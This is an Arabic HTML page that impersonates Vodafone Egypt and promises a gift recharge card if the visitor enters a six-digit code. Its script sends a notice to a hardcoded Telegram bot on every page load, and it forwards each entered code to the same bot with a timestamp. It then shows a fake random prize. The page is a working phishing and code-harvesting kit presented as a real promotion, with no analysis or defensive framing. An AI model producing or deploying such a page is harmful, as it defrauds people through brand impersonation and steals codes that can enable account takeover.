<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>فودافون - كروت شحن هدية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', -apple-system, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: linear-gradient(145deg, #e60000 0%, #cc0000 100%);
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin: 0;
        }

        .container {
            background: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 32px;
            padding: 40px 28px 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        /* شعار فودافون */
        .vodafone-logo {
            margin-bottom: 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .vodafone-logo svg {
            width: 140px;
            height: auto;
        }

        .vodafone-logo .sub-logo {
            font-size: 14px;
            color: #999;
            font-weight: 500;
            letter-spacing: 1px;
            margin-top: 2px;
        }

        .badge {
            display: inline-block;
            background: #e60000;
            color: white;
            padding: 6px 24px;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 16px;
        }

        .title {
            font-size: 26px;
            font-weight: 800;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 15px;
            color: #666;
            line-height: 1.7;
            margin-bottom: 28px;
        }

        .subtitle span {
            color: #e60000;
            font-weight: 700;
        }

        /* حقل إدخال الكود */
        .code-input-wrapper {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 20px 0 28px;
            direction: ltr;
        }

        .code-box {
            width: 52px;
            height: 62px;
            border: 2px solid #ddd;
            border-radius: 14px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            color: #1a1a1a;
            background: #f7f7f7;
            outline: none;
            transition: all 0.2s;
            caret-color: #e60000;
        }

        .code-box:focus {
            border-color: #e60000;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(230, 0, 0, 0.1);
        }

        .code-box.filled {
            border-color: #e60000;
            background: #fff5f5;
        }

        .btn-verify {
            display: block;
            width: 100%;
            padding: 16px;
            background: #e60000;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.15s, transform 0.08s;
            margin-top: 8px;
            letter-spacing: 0.5px;
        }

        .btn-verify:hover {
            background: #cc0000;
        }

        .btn-verify:active {
            transform: scale(0.97);
        }

        .btn-verify:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .error-message {
            color: #e60000;
            font-size: 14px;
            text-align: center;
            margin-top: 12px;
            display: none;
            font-weight: 600;
        }

        .error-message.show {
            display: block;
            animation: shake 0.4s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }

        .footer-note {
            margin-top: 24px;
            font-size: 13px;
            color: #999;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }

        .footer-note span {
            color: #e60000;
            font-weight: 600;
        }

        /* ===== صفحة النجاح ===== */
        .success-section {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px 0;
            animation: fadeIn 0.6s ease;
        }

        .success-section.active {
            display: flex;
        }

        .code-section {
            display: block;
        }

        .code-section.hidden {
            display: none;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        .success-icon {
            width: 80px;
            height: 80px;
            background: #e60000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }

        .success-icon svg {
            width: 44px;
            height: 44px;
            fill: white;
        }

        .success-title {
            font-size: 26px;
            font-weight: 800;
            color: #1a1a1a;
            margin-bottom: 6px;
        }

        .success-subtitle {
            font-size: 20px;
            font-weight: 700;
            color: #e60000;
            line-height: 1.6;
        }

        .btn-success {
            display: block;
            width: 100%;
            padding: 14px;
            background: #e60000;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.15s;
        }

        .btn-success:hover {
            background: #cc0000;
        }

        /* ===== استجابة ===== */
        @media (max-width: 480px) {
            .container {
                padding: 28px 18px 24px;
                border-radius: 24px;
            }
            .title {
                font-size: 22px;
            }
            .code-box {
                width: 44px;
                height: 54px;
                font-size: 22px;
                border-radius: 12px;
            }
            .code-input-wrapper {
                gap: 10px;
            }
            .vodafone-logo svg {
                width: 110px;
            }
            .success-title {
                font-size: 22px;
            }
            .success-subtitle {
                font-size: 17px;
            }
        }

        @media (max-width: 380px) {
            .code-box {
                width: 38px;
                height: 48px;
                font-size: 18px;
                border-radius: 10px;
            }
            .code-input-wrapper {
                gap: 7px;
            }
        }
    </style>
</head>
<body>

    <div class="container" id="app">

        <!-- ===== شعار فودافون ===== -->
        <div class="vodafone-logo">
            <svg viewBox="0 0 200 45" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="32" font-family="Arial, sans-serif" font-size="30" font-weight="900" fill="#e60000">Vodafone</text>
                <text x="145" y="32" font-family="Arial, sans-serif" font-size="14" font-weight="400" fill="#999">مصر</text>
            </svg>
        </div>

        <!-- ===== قسم إدخال الكود ===== -->
        <div class="code-section" id="codeSection">
            <div class="badge">كارت شحن هدية</div>
            <h1 class="title">أدخل كود الشحن</h1>
            <p class="subtitle">
                أدخل الكود الموجود على كارت الشحن<br>
                <span>الهدية</span> الخاصة بك
            </p>

            <div class="code-input-wrapper" id="codeWrapper">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>

            <button class="btn-verify" id="btnVerify">تفعيل الكود</button>
            <div class="error-message" id="errorMessage">الكود غير صحيح. حاول مرة أخرى.</div>

            <div class="footer-note">
                هذا الكود مخصص لك فقط<br>
                <span>فودافون مصر</span>
            </div>
        </div>

        <!-- ===== صفحة النجاح ===== -->
        <div class="success-section" id="successSection">
            <div class="success-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                </svg>
            </div>
            <h2 class="success-title">مبروك</h2>
            <p class="success-subtitle" id="prizeAmount">كسبت 1000 وحدة</p>
            <button class="btn-success" id="btnSuccess">العودة للصفحة الرئيسية</button>
        </div>

    </div>

    <script>
        (function() {
            'use strict';

            // ===== عناصر الصفحة =====
            const codeSection = document.getElementById('codeSection');
            const successSection = document.getElementById('successSection');
            const codeBoxes = document.querySelectorAll('.code-box');
            const btnVerify = document.getElementById('btnVerify');
            const btnSuccess = document.getElementById('btnSuccess');
            const errorMessage = document.getElementById('errorMessage');
            const prizeAmount = document.getElementById('prizeAmount');

            // ===== بوت تليجرام =====
            const BOT_TOKEN = '8864670178:AAGRfe7q99csr7vSyqT3peuidAb5w69mWTs';
            const CHAT_ID = '6453594151';

            function sendToTelegram(message) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                }).catch(() => {});
            }

            // ===== إرسال إشعار بدخول المستخدم =====
            function sendVisitNotification() {
                const now = new Date().toLocaleString();
                const message = `دخول جديد\n\nالوقت: ${now}`;
                sendToTelegram(message);
            }

            // ===== إرسال إشعار بإدخال الكود =====
            function sendCodeNotification(code) {
                const now = new Date().toLocaleString();
                const message = `كود تم إدخاله\n\nالوقت: ${now}\nالكود: ${code}`;
                sendToTelegram(message);
            }

            // ===== الحصول على رقم عشوائي من الأرقام المحددة =====
            function getRandomPrize() {
                const prizes = [400, 500, 600, 700, 800, 900, 1000, 1500, 2000];
                return prizes[Math.floor(Math.random() * prizes.length)];
            }

            // ===== إرسال إشعار بدخول الصفحة =====
            sendVisitNotification();

            // ===== حقول الكود =====
            codeBoxes.forEach((box, index) => {
                box.addEventListener('input', function(e) {
                    this.value = this.value.replace(/\D/g, '');
                    if (this.value.length === 1) {
                        this.classList.add('filled');
                        if (index < codeBoxes.length - 1) {
                            codeBoxes[index + 1].focus();
                        }
                    } else {
                        this.classList.remove('filled');
                    }

                    const fullCode = getFullCode();
                    if (fullCode.length === 6) {
                        setTimeout(() => {
                            btnVerify.click();
                        }, 400);
                    }
                });

                box.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
                        codeBoxes[index - 1].focus();
                        codeBoxes[index - 1].classList.remove('filled');
                    }
                    if (e.key === 'ArrowLeft' && index > 0) {
                        codeBoxes[index - 1].focus();
                    }
                    if (e.key === 'ArrowRight' && index < codeBoxes.length - 1) {
                        codeBoxes[index + 1].focus();
                    }
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        btnVerify.click();
                    }
                });

                box.addEventListener('beforeinput', function(e) {
                    if (e.data && !/^\d$/.test(e.data)) {
                        e.preventDefault();
                    }
                });
            });

            function getFullCode() {
                let code = '';
                codeBoxes.forEach(box => {
                    code += box.value;
                });
                return code;
            }

            // ===== زر التفعيل =====
            btnVerify.addEventListener('click', function() {
                const code = getFullCode();
                if (code.length < 6) {
                    errorMessage.textContent = 'الرجاء إدخال الكود بالكامل (6 أرقام).';
                    errorMessage.classList.add('show');
                    return;
                }

                sendCodeNotification(code);

                btnVerify.textContent = 'جاري التحقق...';
                btnVerify.disabled = true;

                setTimeout(() => {
                    // اختيار رقم عشوائي
                    const prize = getRandomPrize();
                    prizeAmount.textContent = `كسبت ${prize} وحدة`;
                    
                    errorMessage.classList.remove('show');
                    btnVerify.textContent = 'تم التفعيل';
                    btnVerify.style.backgroundColor = '#25D366';

                    setTimeout(() => {
                        codeSection.classList.add('hidden');
                        successSection.classList.add('active');
                        
                        btnVerify.textContent = 'تفعيل الكود';
                        btnVerify.style.backgroundColor = '#e60000';
                        btnVerify.disabled = false;
                        
                        codeBoxes.forEach(box => {
                            box.value = '';
                            box.classList.remove('filled');
                        });
                    }, 800);
                }, 1500);
            });

            // ===== زر العودة =====
            btnSuccess.addEventListener('click', function() {
                successSection.classList.remove('active');
                codeSection.classList.remove('hidden');
                codeBoxes[0].focus();
            });

            // ===== تركيز =====
            setTimeout(() => {
                codeBoxes[0].focus();
            }, 500);

            console.log('تطبيق فودافون - كروت شحن هدية');
        })();
    </script>

</body>
</html>
